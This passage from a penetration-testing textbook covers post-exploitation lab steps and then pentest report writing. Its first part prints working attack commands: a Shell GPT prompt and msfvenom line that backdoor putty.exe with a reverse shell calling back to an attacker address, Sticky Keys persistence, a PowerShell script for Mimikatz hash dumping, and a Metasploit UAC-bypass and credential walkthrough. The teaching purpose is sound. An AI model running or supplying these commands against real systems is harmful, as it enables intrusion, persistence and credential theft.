ELEVATION OF PRIVILEGE: THE ENUMERATION

• On Windows, we can pass the discovered username as an argument to the net user com-

mand to gather more information.

• Based on the output shown in Figure 8.11, we are running as a user and have gathered additional information, including the groups the user belongs to.

• On Linux- based systems, we can use the id command to collect user context information (Figure 8.12).

Figure 8.11 whoami sous Windows.

Figure 8.12 Id command on Linux.





Post-exploitation techniques and AI-driven privilege escalation 271

• To discover other user accounts on the system, we can use the net user command on Windows- based systems (Figure 8.13).

• The output reveals other accounts, including the manager account (Figure 8.14).

• To enumerate users on a Linux- based system, we can simply read the contents of the

/etc/passwd file (Figure 8.15).

• The passwd file lists multiple user accounts, including accounts used by various services on the target machine such as www- data, which indicates that a web server is probably

installed.

• The enumeration of all users on a target machine can help identify potential high-

privilege user accounts that we might target in an effort to elevate our privileges.

Figure 8.13 Commande net user.

Figure 8.14 Net user command on a user account.





272 Traditional vs Generative AI Pentesting

Figure 8.15 Fichier /etc/passwd.

Host name enumeration

• A machine’s hostname can often provide clues about its functional roles. Most com-

monly, hostnames will include identifiable abbreviations such as web for a web server,

DB for a database server, DC for a domain controller, and so on.

• We can find out the hostname with the aptly named hostname command, which is

installed on both Windows and Linux. Let’s run it on Windows first (Figure 8.16).

Then under Linux (Figure 8.17):

• The rather generic name of the Windows machine indicates a possible naming con-

vention within the network that could help us find additional workstations, while the

Linux client hostname provides us with information about the distribution and the

potential role or usage of the machine. Identifying the role of a machine can help us

focus our information- gathering efforts.

Figure 8.16 Hostname command on Windows.

Figure 8.17 Hostname command on Linux.





Post-exploitation techniques and AI-driven privilege escalation 273

Enumerating the OS version and architecture

• At some point during the privilege escalation process, we may need to rely on kernel

exploits that specifically exploit vulnerabilities at the core of a target’s operating sys-

tem. These types of exploits are designed for a very specific type of target by a particular combination of operating system and version.

• Since attacking a target with an incompatible kernel exploit can lead to system insta-

bility (resulting in loss of access and likely alerting system administrators), we need to

gather accurate information about the target.

• On the Windows operating system, we can collect specific information about the oper-

ating system and architecture with the systeminfo utility.

• We can also use findstr with some useful indicators to filter the output. Specifically, we can match patterns to the beginning of a line with /B and specify a particular search

string with /C:.

In the example shown in Figure 8.18, we’ll use these options to extract the name of the operating system (Name) as well as its version (Version) and architecture (System).

The output shows that the target system is running Windows 10 Professional version

10.0.19043.

• On Linux, the /etc/issue and /etc/*-release files contain similar information. We can also issue the uname -a command (Figure 8.19).

• The files in the /etc directory contain the operating system version (Debian 11), and

uname -a displays the kernel version (5.10.0-14) and architecture (x86_64).

• For an enumeration as an exhaustive manual, we can use checklists and reference sheets

such as:

• Linux: https:// blog. g0tmi1k. com/ 2011/ 08/ basic- linux- privilege- escalation/.

• Windows: https:// www. fuzzysecurity. com/ tutorials/ 16. html.

Figure 8.18 systeminfo command

Figure 8.19 /etc/issue and /etc/*-release files.





274 Traditional vs Generative AI Pentesting

• There are several automation tools that can help you save time during the counting

process. These tools should only be used to save time, as they may miss some privilege

escalation vectors. Below is a list of enumeration tools popular Linux and windows

with links to their respective Github repositories.

• Linux:

• LinPeas: https:// github. com/ carlospolop/ privilege- escalation- awesome- scripts- suite/

tree/ master/ linPEAS

• LinEnum: https:// github. com/ rebootuser/ LinEnum

• LES (Linux Exploit Suggester): https:// github. com/ mzet- / linux- exploit- suggester

• Linux Smart Enumeration: https:// github. com/ diego- treitos/ linux- smart- enumeration

• Linux Priv Checker: https:// github. com/ linted/ linuxprivchecker

• Windows:

• WinPeas: https:// github. com/ carlospolop/ PEASS- ng/ tree/ master/ winPEAS

• PrivescCheck: https:// github. com/ itm4n/ PrivescCheck

• WES- NG: https:// github. com/ bitsadmin/ wesng

Automating enumeration with GENAI tools

• Scenario: Use pre- built tools for privilege escalation enumeration (Figures 8.20, 8.21

and 8.22).

Figure 8.20 Automated enumeration through SGPT.





Post-exploitation techniques and AI-driven privilege escalation 275

Figure 8.21 Winpeas.

Figure 8.22 WinPeas users’ enumeration.





276 Traditional vs Generative AI Pentesting

EXPLOIT KERNEL VULNERABILITIES THROUGH AI

Identify the kernel version

Use Shell GPT to help you generate commands for retrieving kernel information (Figures

8.23 and 8.24).

Figure 8.23 Enumerate Kernel Version through SGPT.

Figure 8.24 Enumerate kernel version using exploit suggester.





Post-exploitation techniques and AI-driven privilege escalation 277

Then, we download a public exploit code, compile the code, and test it against the target

machine.

ELEVATION OF PRIVILEGE: SUDO

• The order sudo, by default, allows you to run a program with root privileges. Under certain conditions, system administrators may need to give regular users some flexibility on their privileges. For example, a junior SOC analyst may need to use Nmap regu-

larly but will not be allowed full root access. In this situation, the system administrator can allow it to run Nmap only with root privileges while maintaining its usual privilege

level in the rest of the system.

• Any user can check their current root privilege status using the sudo command -l.

• https:// gtfobins. github. io/ is a valuable source that provides information on how any program, on which one may have sudo rights,, can be used (Figure 8.25).

Figure 8.25 List of GTFOBins Unix Binaries.





278 Traditional vs Generative AI Pentesting

ELEVATION OF PRIVILEGE: SUID/GUID

Search and use of SUID files

• This technique involves checking the files with the SUID bit set/GUID. This means that

the file(s) can be run with the permissions of the owner(s)/filegroup(s). In this case, as a superuser. We can leverage this to get a shell with these privileges!

SUID

• As we all know, in Linux, everything is a file, including directories and devices that have permissions to allow or restrict three operations, that is, read/write/execute. So, when

you set a permission for a file, you need to know which Linux users you are allowing

or restricting all three permissions to.

Example of SUID operation

• Find SUID Binaries: we can use the command: “find / -perm -u=s -type f 2>/dev/null”

to search the file system for SUID/GUID files.

• find - Lance la commande “find”.

• / - Search the entire file system.

• -perm - search for files with specific permissions

• -u=s - All permission bit modes are defined for the file. Symbolic modes are accepted

in this form.

• -type f - Search only for files.

• 2>/dev/null - Removes errors.

• For example, with the user user3 we found a SUID binary which is called shell

(Figure 8.26).

• We have a binary that we can modify and run as root, so that’s what we’re going to do

(Figure 8.27).

Figure 8.26 SUID binary.

Figure 8.27 Binary executes as root.





Post-exploitation techniques and AI-driven privilege escalation 279

LATERAL MOVEMENTS

• Lateral movements in a target system are a group of techniques used by pentesters to

move around the network while creating as few alerts as possible. Several techniques

and tools are used to automate this process and cover all possibilities.

• In addition, several penetration tests are external, which means that the pentester must be able to move freely from outside the network to it. We do this using a variety of

techniques. Some of the simplest may be to use a compromised password to access a

desktop environment through a remote desktop and attempt to access other machines

with those credentials. More complicated techniques include using compromised end-

points to act as a proxy for us, by shifting traffic from internal targets to ours.

Example 1:

• Let’s assume that our end goal for a penetration test is to reach an internal code repository, where we got our first compromised system on the target network using a phishing

campaign. Usually, phishing campaigns are more effective against non- technical users,

so our first access can be through a machine in the marketing department.

• Marketing workstations will typically be limited by firewall policies to access all critical services on the network, including administrative protocols, database ports, monitoring

services, or anything else that is not needed for their day- to- day work, including code

repositories.

• To reach sensitive hosts and services, we need to switch to other hosts and pivot from

there to our end goal. To this end, we could try to elevate privileges on the Marketing

workstation and extract password hashes from local users. If we find a local administra-

tor, the same account can be present on other hosts. After doing some reconnaissance, we

find a workstation with the name DEV- 001- PC. We use the local administrator’s pass-

word hash to access DEV- 001- PC and confirm that it belongs to one of the company’s

developers. From there, access to our target code repository is available (Figure 8.28).

Note that while lateral movement can be used to bypass firewall restrictions, it is

also useful for evading detection. In our example, even if the Marketing workstation

had direct access to the code repository, it is probably desirable to log in through the

Figure 8.28 Lateral movements.





280 Traditional vs Generative AI Pentesting

developer’s PC. This behavior would be less suspicious from the perspective of a Blue

Team analyst checking login audit logs.

• To move within a network, one must have valid login credentials. It is possible to obtain these credentials either through social engineering techniques such as phishing. Other

techniques commonly used to retrieve login credentials include:

• Pass the Hash is an authentication method that does not require the user’s pass-

word. This technique bypasses standard identification processes by retrieving valid

password hashes that, once authenticated, allow the attacker to perform actions on

local or remote systems.

• Pass the Ticket is a Kerberos ticket- based authentication method. An intruder who has compromised a domain controller can generate an offline Kerberos “Golden

Ticket” with unlimited validity, which can be used to spoof any account, even after

the password has been reset.

• Mimikatz tools are used to steal authentication certificates and plain- text passwords cached from a compromised machine’s memory. These certificates and pass-

words can then be used to log in to other machines.

• Keyloggers allow attackers to directly retrieve passwords when an unsuspecting

user enters them from their keyboard.

PERSISTENCE

• After you’ve successfully penetrated your target’s internal network for the first time,

you’ll want to make sure you don’t lose access to it before you achieve your goals.

Establish the persistence is one of the first tasks we will have to perform as a pentester when accessing a network.

• Simply put, persistence refers to creating other ways to regain access to a host without going through the operation phase again.

• There are many reasons why you would want to establish persistence as quickly as pos-

sible, including:

• Re- exploitation is not always possible: some unstable exploits can kill the vulner-

able process during exploitation, allowing some of them to be fired only once.

• Gaining initial access to the internal network from the outside is difficult to repli-

cate: for example, if you used a phishing campaign To get your first access, repeat-

ing it to regain access to a web host is just too much work. Your second campaign

might also not be as effective, leaving you without access to the network.

• The cyber defense team (blue team) is behind you: any vulnerability used to get

your first access can be corrected if your actions are detected. You’re in a race

against time!

• Even with admin hashes or passwords, there is always the risk of changing credentials

at some point.

• As a result, there are more sneaky ways to regain access to a compromised machine,

which complicates the cyber defense team’s life. One of these ways is the use of

backdoors.

Backdoor

• Backdoor is a method that allows a pentester/hacker to remotely access a target sys-

tem without exploiting a vulnerability of the system in question. It should run in the





Post-exploitation techniques and AI-driven privilege escalation 281

background and does not appear in software that is in use. A backdoor can be used to

spy on a user, manage their files, install additional software or malware, monitor the

entire PC system, and attack other hosts.

• Often, the backdoor also has other malicious functions, such as keystroke logging,

screen capture, various infections, and file encryption.

Example 2: Creating a backdoor with msfvenom

Command to generate an executable backdoor:

sgpt --shell “Generate a command to create a reverse shell payload with msfvenom embed-

ded in PuTTY.exe that connects to attacker IP 192.168.1.100 on port 4444.”

Expected Output:

Use the following command to create the backdoor:

msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp

lhost=192.168.1.100 lport=4444 -b "\\x00" -f exe -o putty_backdoor.exe

This will embed a reverse shell payload in putty.exe. Once executed on the target machine,

it will connect back to the attacker on 192.168.1.100:4444.

Example 3: Sticky keys persistence

Command to replace sethc.exe with cmd.exe for Sticky Keys persistence:

sgpt --shell “Generate commands to replace sethc.exe with cmd.exe for persistence using

Sticky Keys on Windows, ensuring proper permissions are set.”

Run the following commands on the compromised Windows system:

1. Take ownership of sethc.exe:

takeown /f C:\\Windows\\System32\\sethc.exe

2. Grant full permissions to the current user:

icacls C:\\Windows\\System32\\sethc.exe /grant %username%:F

3. Backup the original sethc.exe: copy C:\\Windows\\System32\\sethc.exe C:\\Windows\\

System32\\sethc_backup.exe

4. Replace sethc.exe with cmd.exe: copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\

System32\\sethc.exe

5. To trigger the backdoor, press the Shift key five times at the login screen.

Example 4: Automating the process with a script

Command to generate a complete script for automating Mimikatz hash retrieval, creating a

backdoor, and enabling Sticky Keys persistence:

sgpt --shell “Generate a full script to automate retrieving hashes with Mimikatz, creating a msfvenom backdoor, and implementing Sticky Keys persistence on a Windows target.”





282 Traditional vs Generative AI Pentesting

Here’s the automated script:

```powershell

# Set up Mimikatz for NTLM hash retrieval

Write-

Host "Running Mimikatz…"

Start-

Process mimikatz.exe -ArgumentList 'privilege::debug lsadump::lsa /

patch log hash_dump.txt'

# Create a backdoor with msfvenom

Write-

Host "Creating backdoor with msfvenom…"

Invoke-

Expression "msfvenom -a x64 --platform windows -x putty.exe -k -p

windows/x64/shell_reverse_tcp lhost=192.168.1.100 lport=4444 -b '\x00'

-f exe -o putty_backdoor.exe"

# Replace sethc.exe with cmd.exe for Sticky Keys persistence

Write-

Host "Replacing Sticky Keys binary…"

Invoke-

Expression "takeown /f C:\\Windows\\System32\\sethc.exe"

Invoke-

Expression "icacls C:\\Windows\\System32\\sethc.exe /grant

%username%:F"

Invoke-

Expression "copy C:\\Windows\\System32\\sethc.exe C:\\Windows\\

System32\\sethc_backup.exe"

Invoke-

Expression "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\

System32\\sethc.exe"

Write-

Host "Setup complete. Hashes saved, backdoor created, and

persistence enabled."

PRIVILEGE ESCALATION TO COLLECT THE HASHDUMP USING

MIMIKATZ

Mimikatz is a post- mining tool that allows users to save and view authentication informa-

tion such as kerberos tickets, emptied passwords, PINs, and hashes. It allows you to perform functions such as pass- the- hash, pass- the- ticket, and perform lateral post- mining movements within a network. Here, we use Metasploit’s Mimikatz module, also known as kiwi, to extract hashes from the target machine.

1. In the previous lab, we have already created a shared directory or folder at the location (/var/www/html) with the required access permissions. We will therefore use the same shared directory or folder to share Windows.exe with the victim machine.

Note: To create a new directory to share the Windows.exe file with the target machine and grant it the necessary permissions, use the commands below:

• Type mkdir /var/www/html/share and press Enter to create a shared folder.

• Type chmod -R 755 /var/www/html/share and press Enter.

• Type chown -R www- data:www- data /var/www/html/share and press Enter.

• Copy the payload to the shared folder by typing cp /home/maleh/Download/

Windows.exe /var/www/html/share/ in the terminal window and press Enter.

• Start the Apache server by typing apache2 start service and press Enter (Figure 8.29).

Prompt:

sgpt --shell "Generate a command to create a reverse shell payload

with msfvenom for a Windows 11 target with LHOST 172.16.253.128 and

LPORT 444, saving it as /home/maleh/Download/Exploit.exe."





Post-exploitation techniques and AI-driven privilege escalation 283

Figure 8.29 Payload generation.



2. Type msfconsole in the terminal window and press Enter to launch Metasploit

Framework.

3. In Metasploit, type use exploit/multi/handler and press Enter.

4. Now, type set payload windows/meterpreter/reverse_top and press Enter (Figure 8.30).

Prompt: sgpt --shell “Generate commands to set up a Metasploit

listener for a Windows meterpreter reverse shell on LHOST

172.16.253.128 and LPORT 444.”

Figure 8.30 Exploit configuration.



284 Traditional vs Generative AI Pentesting

5. Switch to Windows 11 VM. Sign in to the Windows 11 virtual machine with your user-

name and password.

6. Open any web browser (in this case, Microsoft Edge). In the address bar, place your

mouse cursor, type http:// 172. 16. 253. 128/ share, and press Enter. As soon as you press Enter, the contents of the shared folder are displayed, as shown in the screenshot.

7. Click Windows.exe to download the file. /share indexes.

8. Double- click the Windows.exe file. The Open File—Security Warning window appears;

click Run (Figure 8.31).

9. Leave the Windows 11 machine running and switch to the Kali Linux virtual machine

(Figure 8.32).

10. The Meterpreter session was opened successfully, as shown in the screenshot.

11. Type sysinfo and press Enter. This command displays information about the target

machine, such as the computer name, operating system, and domain (Figure 8.33).

12. To set the LHOST option, type set LHOST 172.16.253.128 and press Enter.

13. To set the TARGET option, type set TARGET 0 and press Enter (here, O indicates

nothing other than the ID of the exploit target).

14. Type exploit and press Enter to launch the exploit on the Windows 11 machine (Figures

8.34 and 8.35).

15. The BypassUAC exploit managed to bypass the UAC setting on the Windows 11

machine.

16. Type getsystem- t 1 and press Enter to elevate the privileges.

17. Now type getuid and press Enter. The meterpreter session now runs with system privi-

leges (Figure 8.36).

Prompt: sgpt --shell “Generate commands to verify the Meterpreter session and run

basic system information commands.”

18. Type load kiwi into the console and press Enter to load mimikatz (Figure 8.37).

19. Type help kiwi and press Enter to view all kiwi commands (Figure 8.38).

Figure 8.31 Exploit execution.





Post-exploitation techniques and AI-driven privilege escalation 285

Figure 8.32 Exploit configuration.

Figure 8.33 Exploit bypassuac.





286 Traditional vs Generative AI Pentesting

Figure 8.34 Lunch exploit.

Figure 8.35 Session meterpreter.

Figure 8.36 Elevate the privilege.

Figure 8.37 Load Mimikatz.



Post-exploitation techniques and AI-driven privilege escalation 287

Figure 8.38 Help Kiwi.

20. Now we’re going to use some of these commands to load hashes.

21. Type Isa_dump_sam and press Enter to load the NTLM hash of all users (before that type getsystem and creds_all) (Figure 8.39).

22. To view the connection hashes of the LSA secrets, type Isa_dump_secrets and press

Enter.

Note: LSA secrets are used to manage a system’s local security policy and contain

sensitive data such as user passwords, IE passwords, service account passwords, SQL

passwords, and so on.

Prompt: sgpt --shell “Generate commands to load Mimikatz (kiwi) in a Meterpreter

session and retrieve NTLM hashes.” (Figure 8.40).

23. We will now change the Admin password using the password change module.

24. In the console, type password_change u- Admin n- [NTLM hash of Admin obtained in

the previous step] -P password (here, the NTLM hash of the user maleh is: 74de7823e0f-5b2a9ec49838245c7102e) (Figure 8.41).

25. We can see that the password has been successfully changed.

26. Check the new hash value by typing Isa_dump_sam and press Enter to load the NTLM

hashes of all users (Figure 8.42).





288 Traditional vs Generative AI Pentesting

Figure 8.39 LSA Dump.

Figure 8.40 NTLM hash.

27. We can observe that the maleh password has been successfully changed and the new

NTLM hash is displayed.

Prompt: sgpt --shell “Generate commands to change an Admin account password

using the NTLM hash obtained with Mimikatz.”





Post-exploitation techniques and AI-driven privilege escalation 289

Figure 8.41 Pass the hash.

Figure 8.42 Change the hash.

28. Now, check if the login password has changed for the target system (here, Windows 11).

29. Switch to the Windows 11 virtual machine and lock the machine.

Note: If you are already logged in with the Admin account, log out and log in again.

30. Click Ctrl+ Alt+ Del, by default the maleh user profile is selected, type your password in

the Password field and press Enter to log in (Figure 8.43).

Figure 8.43 Opening session using the old password.





290 Traditional vs Generative AI Pentesting

31. You can see that if we try to log in with the old password, we get the error The password is incorrect. Try again.

32. Click OK, and log in with the password we changed using mimikatz (Figure 8.44).

33. You will be able to log in successfully using the new password (Figure 8.45).

Figure 8.44 Opening session using the new password.

Figure 8.45 Session opened successfully.





Post-exploitation techniques and AI-driven privilege escalation 291

34. This concludes the demonstration of privilege escalation to collect the Hashdump using Mimikatz.

35. Close all open windows and document all the information obtained.

CONCLUSION

This chapter presented a comprehensive overview of post- exploitation techniques, empha-

sizing the integration of AI tools like Shell GPT to automate and enhance the penetration

testing process. By leveraging AI, testers can expedite critical tasks such as privilege escalation, password cracking, and lateral movement. Tools such as Mimikatz, Metasploit, and

WinPEAS were combined with AI- generated commands to simplify system enumeration,

automate payload creation, and enable persistence through backdoor mechanisms like Sticky

Keys exploits. AI- driven automation not only reduces manual effort but also allows testers to focus on strategic aspects of post- exploitation, such as understanding system misconfigurations and identifying potential attack paths.

The inclusion of AI in post- exploitation workflows demonstrates its transformative poten-

tial in penetration testing, enabling ethical hackers to simulate real- world scenarios with greater speed, precision, and stealth. The chapter highlights how AI complements traditional tools, bridging the gap between complex technical skills and practical automation to deliver comprehensive security assessments.

REFERENCES

Baloch, R. (2017). Ethical hacking and penetration testing guide. Auerbach Publications.

Benito, R., Shaffer, A., & Singh, G. (2023a). An Automated Post- Exploitation Model for Cyber Red

Teaming. International Conference on Cyber Warfare and Security, 18(1), 25–34.

Benito, R., Shaffer, A., & Singh, G. (2023b). An Automated Post- Exploitation Model for Cyber Red

Teaming. International Conference on Cyber Warfare and Security, 18(1), 25–34.

Blaauwendraad, B., Ouddeken, T., & Van Bockhaven, C. (2020). Using Mimikatz’driver, Mimidrv, to

disable Windows Defender in Windows. Comput. Sci.

Dutt, H. (2021). Privilege Elevation. In Interprocess Communication with macOS: Apple IPC Methods

(pp. 243–274). Springer.

Elgohary, N., & Abdelbaki, N. (2022). Detecting Mimikatz in Lateral Movements Using Windows

API Call Sequence Analysis. 2022 4th Novel Intelligent and Leading Emerging Sciences Conference

(NILES), 306–310.

Li, Y., Jiang, Y., Li, Z., & Xia, S.-T. (2022). Backdoor learning: A survey. IEEE Transactions on Neural Networks and Learning Systems.

Maleh, Y. (2024). Web application PenTesting: A comprehensive Guide for professionals. CRC Press.

Tabatabai Irani, M., & Weippl, E. R. (2009). Automation of post- exploitation. International Journal of

Web Information Systems, 5(4), 518–536.

Wang, H., Xue, Y., Feng, X., Zhou, C., & Mi, X. (2024). Port Forwarding Services Are Forwarding

Security Risks. ArXiv Preprint ArXiv:2403.16060.

Zaydi, M., & Maleh, Y. (2024). Empowering Red Teams with Generative AI: Transforming Penetration Testing Through Adaptive Intelligence. EDPACS, 1–26. https://doi.org/10.1080/07366981.2024.

2439628





Chapter 9

GenAI for automating and enhancing

penetration testing reports

INTRODUCTION

In the field of cybersecurity, the Penetration Testing (PT) report stands as the ultimate and arguably the most critical deliverable, providing clients with an in-depth overview of security testing outcomes (Messier & Messier, 2016). This chapter focuses on transforming the traditional PT report by exploring how Generative AI (GenAI) can streamline its creation, making it more comprehensive and impactful. Through the course of this chapter, readers will gain

insights into how GenAI can help tailor PT reports to meet the diverse expectations of various audiences, including technical staff and executive leadership (Svensson, 2016).

A well-structured report is essential, and we will discuss how GenAI-powered tools, such

as Dradis, can help organize findings, issues, and supporting evidence efficiently, improving the report’s clarity and persuasive power (Al Shebli & Beheshti, 2018). Moreover, we will examine how Generative AI can assist in formulating clear, actionable remediation recommendations, guiding clients on strengthening their security posture in response to identified vulnerabilities (Baloch, 2017).

As the chapter progresses, we will outline a roadmap for crafting a PT report that not only encapsulates the findings but also resonates with and is actionable for the client, ensuring the report is a true reflection of the strategic insights and technical rigor applied throughout the

testing process (Zakaria et al., 2019).

While PT reports are often seen as a necessary but tedious part of the process, they hold

immense value when done correctly. A well-written, professional report can sometimes gar-

ner more positive attention than even the most technically flawless, but poorly communi-

cated, findings (Alghamdi, 2021).

In this context, we present a set of guidelines that can be enhanced with GenAI, ensuring

the report’s message is both clear and compelling. These include:

• Keeping the report aligned with the initial objectives and specifications.

• Understanding that the report will be read by various professionals with different levels of technical expertise, from directors to developers.

• Being selective about which elements to include, as it is impractical and inefficient to document every single test.

• Focusing on the presentation of the report to engage the reader and ensure they can

easily find the relevant information.

With these recommendations, GenAI can elevate the process of writing a professional, coher-

ent report that communicates the intended message effectively, ensuring it reflects the meticulous work behind the PT and aligns with the client’s needs. Ultimately, this report is the key 292

DOI: 10.1201/9781003640318-9





GenAI for automating and enhancing penetration testing reports 293

deliverable that represents the work we do—let’s ensure it showcases both our technical

expertise and our communication skills in the best possible light.

RISK RANKING

This section defines the organization’s overall risk ranking (Wilbanks et al., 2014). You will use a scoring mechanism that should be agreed upon during pre-engagement.

The DREAD (Damage potential, Reproducibility, Exploitability, Affected users, and

Discoverability) model is an example (Zhang et al., 2022). Each aspect can be defined as follows:

• Damage potential: to what extent are assets affected? Reproducibility.

• How easy is it to reproduce the attack?

• Operability: how easy is it to operate the property?

• Affected users: How many users are affected?

• Discoverability: how easily can a vulnerability be discovered?

You’ll assign a risk rating to each item you discover by answering these questions. This value can be high, medium, or low. The risk assessment value can be simple and expressed in numbers, for example, Low = 1, Medium = 2, and High = 3, as shown in Table 9.1.

The sum of all values determines the level of risk.

Here’s an example of how to use the DREAD model for a discovery:

Vulnerability discovered: Lack of input sanitization allows an SQL injection attack to extract user details from the SQL database.

Analysis of the scores assigned to the DREAD model to determine the risk score:

• The standard for vulnerability classification is the CVE (Hankin & Malacaria,

2022). CVE stands for Common Vulnerabilities and Exposures. CVE is a glossary that classifies vulnerabilities. The glossary analyzes vulnerabilities and then uses the

CVSS (Common Vulnerability Scoring System) to assess the threat level of a vulner-

ability (Scarfone & Mell, 2009). A CVE score is often used to rank the criticality of vulnerabilities.

• The CVSS is one of many ways of measuring the impact of vulnerabilities, com-

monly referred to as the CVE score. CVSS is an open set of standards used to evalu-

ate a vulnerability and assign a severity rating on a scale of 0 to 10. The current

version of CVSS is v3.1, which breaks down the scale as shown in Table 9.2.

• In addition to the score and severity given to the vulnerabilities found, we need to

present and classify them in our context and according to their exploitability. In our

report, we’ll focus more on the vulnerabilities we’ve managed to exploit and present

the vulnerabilities we haven’t managed to exploit or haven’t had time to exploit.

Table 9.1 Risk assessment model

Risk assessment

Results

High

12–15

Medium

8–11

Bottom

5–7





294 Traditional vs Generative AI Pentesting

Table 9.2 Scoring model

Severity

Score

None

0

Low

0.1–3.9

Medium

4.0–6.9

High

7.0–8.9

Critical

9.0–10.0

Table 9.3 Sources of vulnerability

Sources of vulnerability

Description

Operating system

These vulnerabilities are found in operating systems (OS) and often lead to

elevating privileges.

Wrong configuration

These types of vulnerabilities stem from a poorly configured application or

service. For example, a website exposing customer details.

Default or simple identifiers

Applications and services with authentication will be delivered with default

credentials during installation. For example, an administrator dashboard

may have the username and password “admin.” These are easy for an

attacker to guess.

Application logic

These vulnerabilities are the result of poorly designed applications. For

example, poorly implemented authentication mechanisms may allow an

attacker to impersonate a user.

Human error

Human factor vulnerabilities are vulnerabilities that take advantage of

human behavior. For example, phishing e-mails are designed to make

humans believe they are legitimate.

• The vulnerabilities in our report need to be classified by their source, as they gener-

ally need to be analyzed and patched by different teams, as shown in Table 9.3.

GENERAL FINDINGS

This section gives you an overview of the results. These will not be specific, detailed results, but rather statistical representations. You can use graphs or tables representing the targets tested, the results, the attack scenarios, and other parameters defined in the pre-engagement phase. You can use graphs representing the cause of problems, for example, lack of operating system hardening = 35%, etc.

The effectiveness of countermeasures can also be listed here. For example, when testing a

web application with a web application firewall, you can report that the firewall stopped two out of five attacks, were stopped by the firewall.

STRATEGIC ROADMAP

Roadmaps provide a prioritized remediation plan. These should be assessed against the com-

pany’s objectives and level of impact. Ideally, this section should correspond to the objectives defined by the organization.

The roadmap can be divided into short-, medium-, and long-term activities. Short-term

activities define what the organization can do within 1–3 months to solve the problems





GenAI for automating and enhancing penetration testing reports 295

discovered. The medium-term could be a period of 3 to 6 months, while the long term would

be a period of 6 to 12 months.

TECHNICAL REPORT

The technical report is where you’ll communicate all the technical details of your discovered results. This section of the document describes the scope of the assignment in detail. The target audience for this section will be personnel with in-depth technical skills, who will likely be the ones to remedy the problems found.

The first part of a technical report is an introduction. This section contains topics such as the people involved in the PT contact information, target systems or applications, objectives and scope. Let’s concentrate on the main topics of the technical report.

TOOLS USED

Sometimes, your customer may want to reproduce the test you’ve carried out. To ensure that

he gets the same results, it would be a good idea to disclose the tools you used and their versions. Here’s an example:

• Test platform: Kali Linux 2023

• Metasploit Framework v6.3: Penetration test framework

• Burp Suite Professional 2023.2: Application testing framework

• Nmap v7.93: Port scanning and counting

Information gathering

In this section, you will write about how much information about the customer is available.

Be sure to highlight the extent of both public and private information. You can break down

this section into two categories if needed:

• Passive information gathering: This section lets you display the information gathered without sending data to the target. For example, you can highlight information obtained

via Google search, DNS, or publicly available documents.

• Active information gathering: In this section, you’ll show the information obtained using techniques such as port scanning and other printing activities. This section reveals

the data obtained by sending data directly to assets.

Publicly accessible information should be a significant concern for any organization, espe-

cially if there is metadata in publicly accessible documents that could reveal the structure of the organization’s usernames.

VULNERABILITY ASSESSMENT AND EXPLOITATION

In this section, you will define the methods used to identify vulnerabilities and how they have been exploited. You will include elements such as the vulnerability classification, evidence of its existence, and details of the CVE.





296 Traditional vs Generative AI Pentesting

When disclosing vulnerabilities, divide them into technical and logical vulnerabilities.

Technical vulnerabilities can be exploited by missing patches, coding errors, or the possibility of injecting malicious code, such as an SQL injection attack.

Logical vulnerabilities are exploited by finding a flaw in how the application works, such

as a web application that fails to check permissions. Here’s an example of how you can

report a vulnerability:

• Finding: Here, you’ll discuss the findings in detail. For example: we’ve discovered that Server01 (192.168.10.15) hasn’t received the MS17-010 patch from Microsoft Windows

and that the server has been manually exploited with DoublePulsar. DoublePulsar cre-

ates a backdoor in the system that anyone can use. It opens the door to ransomware

such as WannaCry and NotPetya, particularly on systems without the MS17-010 patch.

We could exploit this missing patch to access the server with full administrative rights.

Since we have access to the server, we were able to extract the local administrator

account (local admin) and its password hash using Metasploit’s hashdump.

• Affected host: This is where you define the full name of the host or application, for example, CLIENT\Server01 (hostname).

• Tool used: Here, you’ll explain which tool you used, for example, Metasploit Framework v6.3.

• Proof: This is where you provide proof of the exploit. This can be a screenshot or a screen text capture.

• Business impact: In this section, you define the risk associated with the finding. For example, when systems are not patched promptly, they may present a risk that could

be exploited by malware, ransomware, and malicious users to gain access to sensitive

information.

• Primary cause: Defines the cause of vulnerability. It can be technical or process-related, such as the absence of a security patch. For example, the root cause is process-related,

since there is a patch management system. Servers are not patched in a timely manner.

• Recommendations: Here you will define the recommended course of action to remedy

this finding. Be sure to provide as much detail as possible. For example, the short-

term action would be to update the server to ensure it is up to date with all Microsoft

patches. The long-term action would be to ensure that vulnerability assessments are

carried out monthly on the entire network and that patches fully protect servers and

workstations. Management should also search the network for any systems manually

exploited with DoublePulsar and remove them from the network, as they create a back-

door on the system that anyone can use.

Getting the right level of detail in a report can be difficult. Some customers may find the report too detailed and others not thorough enough. The best way to determine how much

detail to include in the report is to spend time with the customer to understand their expectations and what they want to get out of the report.

POST-OP

Once you’ve discussed the vulnerabilities and their exploitation, you must highlight the real impact on the customer. Don’t forget that this impact corresponds to what the customer

would feel during a real attack.

In this section, you can use screenshots to explain the extent of the impact. Here are just a few of the topics you can cover in this section:





GenAI for automating and enhancing penetration testing reports 297

• Privilege escalation paths and techniques, such as “pass-the-hash” attacks and finally

the forgery of a golden ticket.

• The ability to maintain access through persistence.

• The ability to exfiltrate data.

• Other systems accessed using pivot points.

This section can discuss the effectiveness of countermeasures, including both proactive and reactive ones. Detection capabilities are also included in this section; for example, was the antivirus able to detect your payloads?

If incident response activities were triggered during the PT, they should be mentioned in

this section.

CONCLUSION

The conclusion gives a final overview of the PT. In this section, you can recall certain test parts and explain how the customer can improve their safety device. Always end on a positive note, even if the results are poor. This will give your customers the confidence to implement future test activities as they develop.

APPENDICES

They include additional information on PT, such as tools and exploits, snapshots, logs,

risk assessment methodologies, and vulnerability classification, to enable readers to understand the PT report fully. Appendices do not contain essential information, but additional

information, and the most essential information in the report should not be included in the appendices.

USE CASE: AUTOMATING PT REPORTS WITH GENERATIVE AI AND

DRADIS

In this section, we present a PT report which highlights the effectiveness of Large Language Models (LLMs) in generating coherent, human-like content based on specific inputs. The

model was able to synthesize the steps taken to compromise the machine, providing a clear

summary within the “Test Methodology” and “Detailed Findings” sections. The recommen-

dations offered were well-aligned with industry best practices. Additionally, by integrating other tools such as visualization software, LLMs can produce alternative data representations, enhancing the report’s clarity and actionability for clients. This combination of textual analysis and visual aids helps transform complex findings into easily digestible and useful insights for stakeholders.

Pentest findings

Penetration test findings are the security problems discovered during PT. These findings

should be included in the report and ranked according to severity, so readers at the target organization can prioritize work on vulnerabilities with the highest impact, before tackling vulnerabilities or risks with less impact.





298 Traditional vs Generative AI Pentesting

Evaluation of findings

